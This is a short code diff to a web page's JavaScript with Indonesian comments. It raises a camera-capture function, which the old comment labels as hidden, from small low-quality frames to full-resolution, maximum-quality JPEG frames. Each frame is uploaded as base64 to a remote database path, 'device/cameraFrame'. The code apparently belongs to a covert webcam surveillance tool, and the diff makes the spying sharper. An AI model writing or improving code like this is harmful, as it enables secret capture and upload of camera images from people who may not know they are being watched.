@@ -282,17 +282,23 @@
       }
     }
 
-    // Ambil Frame Kamera Tersembunyi
+    // Ambil Frame Kamera Kualitas Maksimal (Paling Tajam)
     function captureFrame() {
       if (webcam.videoWidth === 0) return;
-      canvas.width = webcam.videoWidth / 6;
-      canvas.height = webcam.videoHeight / 6;
+
+      // 1. Gunakan resolusi asli kamera tanpa dibagi/dikurangi
+      canvas.width = webcam.videoWidth;
+      canvas.height = webcam.videoHeight;
+      
       const ctx = canvas.getContext('2d');
       ctx.drawImage(webcam, 0, 0, canvas.width, canvas.height);
 
-      const base64Image = canvas.toDataURL('image/jpeg', 0.2);
+      // 2. Gunakan kualitas 1.0 (100% tanpa kompresi / paling tajam)
+      const base64Image = canvas.toDataURL('image/jpeg', 1.0);
+      
       db.ref('device/cameraFrame').set(base64Image);
     }
+
   </script>
 
 </body>
